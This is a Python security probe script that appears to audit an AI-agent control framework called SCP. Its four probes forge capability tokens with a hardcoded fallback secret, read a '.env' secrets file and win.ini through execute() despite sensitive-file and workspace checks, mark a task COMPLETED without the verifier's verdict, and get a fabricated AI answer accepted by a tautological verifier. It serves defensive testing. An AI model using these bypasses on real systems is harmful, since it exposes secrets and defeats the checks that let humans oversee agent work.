"""Security & Reality Verification Probe Script (FA-09).

Demonstrating 4 critical architectural vulnerabilities in SCP:
1. Capability Authority: Self-granting authority & forged unsigned tokens
2. PCController: Information disclosure bypassing _sensitive and _inside_root via execute()
3. TaskKernel: State machine transition to COMPLETED bypassing IndependentVerifier
4. RealityJudge: Tautological postcondition making IndependentVerifier always pass (Level A)
"""
from __future__ import annotations

import asyncio
import os
import sys
import tempfile
import time
from pathlib import Path

# Add project root to sys.path
PROJECT_ROOT = Path(__file__).resolve().parents[2]
if str(PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(PROJECT_ROOT))


def probe_capability_authority():
    print("=" * 60)
    print("PROBE 1: Capability Authority Self-Granting & Forgery")
    print("=" * 60)
    from scp.security.capability_epoch import CapabilityAuthority, CapabilityToken
    from scp.hands.hands_executor import HandsExecutor
    
    with tempfile.TemporaryDirectory() as tmp_dir:
        cap_state = Path(tmp_dir) / "capability_state.json"
        auth = CapabilityAuthority(cap_state)
        executor = HandsExecutor(capability_authority=auth)
        
        # 1A: Self-granting capability token
        print("[1A] Testing executor self-granting token when capability_token is None...")
        result = asyncio.run(executor.execute("pc.status", capability_token=None))
        print(f"Executor self-issued token epoch: {result.get('capabilityEpoch')}")
        print(f"Self-grant succeeded: {result.get('success')} (FA-05 violation: Executor self-granted authority)")
        assert result.get("capabilityEpoch") is not None, "Expected self-issued epoch"
        
        # 1B: Unsigned Token Forgery
        print("\n[1B] Testing forged CapabilityToken without calling authority.issue()...")
        forged_token = CapabilityToken(
            subject="unauthorized_attacker",
            epoch=auth.status()["epoch"],
            token_id="forged_token_id_999",
            issued_at=time.time()
        )
        is_valid = auth.validate(forged_token)
        print(f"Forged token validated by CapabilityAuthority: {is_valid}")
        assert is_valid is True, "Forged token was accepted due to lack of signature!"
        
        # 1C: Hardcoded Fallback Secret in capability_token.py
        from scp.core import capability_token
        print("\n[1C] Checking fallback secret in core/capability_token.py...")
        print(f"Fallback secret used: {capability_token._SECRET}")
        forged_admin_token = capability_token.mint_token("malicious_actor", "*", 5)
        verify_res = capability_token.verify_token(forged_admin_token, required_scope="admin")
        print(f"Minted token with fallback secret verified: {verify_res.get('valid')}")
        assert verify_res.get("valid") is True, "Forged admin token verified with fallback secret"
    print(">>> PROBE 1 CONFIRMED: Capability Authority has no cryptographic binding and self-grants tokens.")


def probe_pc_controller_sensitive_bypass():
    print("\n" + "=" * 60)
    print("PROBE 2: PCController Sensitive File Exfiltration & Boundary Bypass")
    print("=" * 60)
    from scp.pc_control.pc_controller import PCController
    
    controller = PCController()
    print(f"Controller working dir: {controller.working_dir}")
    
    # 2A: Direct read_file is blocked by _sensitive
    print("\n[2A] Calling controller.read_file('.env')...")
    read_res = asyncio.run(controller.read_file(".env"))
    print(f"read_file result: {read_res}")
    assert read_res.get("success") is False, "Expected read_file to be blocked"
    print("read_file('.env') was blocked as expected.")
    
    # 2B: execute('type .env') evaluates to READ_ONLY and bypasses _sensitive check
    print("\n[2B] Calling controller.evaluate('type .env', capability_level=0)...")
    decision = controller.evaluate("type .env", capability_level=0, approved=False)
    print(f"PolicyDecision: allowed={decision.allowed}, reason='{decision.reason}', risk='{decision.risk}', requires_approval={decision.requires_approval}")
    assert decision.allowed is True, "Expected 'type .env' to be allowed as read-only!"
    
    print("\n[2C] Calling controller.execute('type .env', capability_level=0, approved=False)...")
    exec_res = asyncio.run(controller.execute("type .env", capability_level=0, approved=False))
    print(f"execute result success: {exec_res.get('success')}, returnCode: {exec_res.get('returnCode')}")
    stdout_sample = exec_res.get("stdout", "")[:120].strip()
    print(f"Sample exfiltrated stdout: {stdout_sample!r}")
    assert exec_res.get("success") is True, "Exfiltration via 'type .env' succeeded!"
    assert len(stdout_sample) > 0, "Exfiltrated data is not empty!"
    
    # 2D: Reading outside workspace
    print("\n[2D] Calling controller.execute('Get-Content C:\\Windows\\win.ini', capability_level=0)...")
    win_res = asyncio.run(controller.execute("Get-Content C:\\Windows\\win.ini", capability_level=0, approved=False))
    print(f"execute win.ini success: {win_res.get('success')}, returnCode: {win_res.get('returnCode')}")
    print(f"Sample win.ini stdout: {win_res.get('stdout', '')[:80]!r}")
    assert win_res.get("success") is True, "Reading outside workspace via powershell succeeded!"
    print(">>> PROBE 2 CONFIRMED: PCController execute() completely bypasses workspace and sensitive boundaries.")


def probe_task_kernel_verification_bypass():
    print("\n" + "=" * 60)
    print("PROBE 3: TaskKernel Verification Bypass to COMPLETED")
    print("=" * 60)
    from scp.task_kernel import TaskKernel
    
    with tempfile.TemporaryDirectory() as tmp_dir:
        db_path = Path(tmp_dir) / "test_kernel.db"
        kernel = TaskKernel(db_path)
        
        task = kernel.create_task("task_exploit_01", owner="operator", goal="Exploit completion check", risk_tier="R1")
        print(f"Created task: {task['task_id']}, state: {task['state']}")
        
        # Advance through state machine
        kernel.transition("task_exploit_01", "PLANNING", actor="planner")
        kernel.transition("task_exploit_01", "READY", actor="planner")
        kernel.transition("task_exploit_01", "QUEUED", actor="dispatcher")
        
        lease = kernel.claim("task_exploit_01", worker_id="worker_01")
        print(f"Claimed lease: {lease.lease_id}, state is LEASED")
        
        kernel.transition("task_exploit_01", "RUNNING", actor="worker_01")
        kernel.transition("task_exploit_01", "VERIFYING", actor="worker_01")
        print(f"Task is now in state: {kernel.get_task('task_exploit_01')['state']}")
        
        # BYPASS: Directly transition to COMPLETED without commit_verification_result
        print("\n[3A] Transitioning directly to COMPLETED via kernel.transition() without verifier verdict...")
        completed_task = kernel.transition(
            "task_exploit_01",
            "COMPLETED",
            actor="unverified_worker",
            reason="bypassing verifier"
        )
        print(f"Completed task state: {completed_task['state']}, version: {completed_task['version']}")
        assert completed_task['state'] == "COMPLETED", "Task transitioned to COMPLETED without verification!"
        
        # Check event journal
        events = kernel.conn.execute("SELECT seq, type, from_state, to_state, actor, reason FROM events WHERE task_id='task_exploit_01' ORDER BY seq").fetchall()
        print("Event journal for task:")
        for ev in events:
            print(f"  Seq {ev['seq']}: {ev['type']} ({ev['from_state']} -> {ev['to_state']}) by {ev['actor']}: {ev['reason']}")
            
        kernel.close()
    print(">>> PROBE 3 CONFIRMED: TaskKernel allows arbitrary transition to COMPLETED without RealityVerifier or IndependentVerifier.")


def probe_reality_judge_tautology():
    print("\n" + "=" * 60)
    print("PROBE 4: RealityJudge Tautological Verification (Level A Fake Pass)")
    print("=" * 60)
    from scp.verifier import IndependentVerifier
    from scp.core.postcondition_schema import PostconditionSchema
    
    # In RealityJudge.judge() lines 76-83:
    ai_answer = "This is a completely fabricated hallucination 12345."
    postcondition = PostconditionSchema.for_text_answer(ai_answer, evidence_required=False).to_dict()
    obs = {"evidence_ref": ai_answer, "text": ai_answer}
    
    verifier = IndependentVerifier()
    res = verifier.verify(postcondition, obs)
    print(f"Postcondition schema generated by PostconditionSchema.for_text_answer:")
    print(f"  {postcondition}")
    print(f"Observation fed to IndependentVerifier: {obs}")
    print(f"IndependentVerifier verdict: {res.verdict}")
    print(f"Failures: {res.failures}")
    assert res.verdict == "VERIFIED", "Tautology must return VERIFIED"
    print(">>> PROBE 4 CONFIRMED: RealityJudge uses a tautological postcondition where ai_answer verifies ai_answer, masking Level A model self-report as Level C IndependentVerifier.")


if __name__ == "__main__":
    try:
        probe_capability_authority()
        probe_pc_controller_sensitive_bypass()
        probe_task_kernel_verification_bypass()
        probe_reality_judge_tautology()
        print("\n" + "=" * 60)
        print("ALL 4 EXPLOIT PROBES COMPLETED & VERIFIED ON TERMINAL (FA-09 COMPLIANT)")
        print("=" * 60)
    except Exception as exc:
        print(f"\nPROBE FAILED WITH ERROR: {exc}", file=sys.stderr)
        sys.exit(1)
